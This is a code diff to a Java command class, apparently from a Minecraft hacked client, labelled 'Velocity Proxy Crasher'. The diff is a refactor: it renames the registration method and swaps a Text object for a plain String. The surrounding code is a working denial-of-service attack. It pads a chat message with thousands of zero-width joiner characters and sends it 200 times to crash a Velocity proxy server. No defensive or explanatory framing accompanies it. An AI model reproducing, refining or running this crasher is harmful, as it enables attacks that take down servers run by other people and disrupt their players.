@@ -9,7 +9,6 @@ import net.paradise_client.command.Command;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
 import net.minecraft.command.CommandSource;
-import net.minecraft.text.Text;
 
 /**
  * Command: Velocity Proxy Crasher
@@ -23,7 +22,8 @@ public class VelocityCrasherCommand extends Command {
     /**
      * Register command arguments
      */
-    public void register(LiteralArgumentBuilder<CommandSource> root) {
+    @Override
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
         LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));
 
         RequiredArgumentBuilder<CommandSource, String> serverArg =
@@ -53,10 +53,10 @@ public class VelocityCrasherCommand extends Command {
             int power = ctx.getArgument("power", Integer.class);
 
             String filler = "\u200d"; // Zero-width joiner
-            Text msgText = Text.literal("server " + server + " " + filler.repeat(power));
+            String message = "server " + server + " " + filler.repeat(power);
 
             for (int i = 0; i < 200; i++) {
-                net.sendPacket(new ChatMessageC2SPacket(msgText));
+                net.sendPacket(new ChatMessageC2SPacket(message));
             }
 
             try {
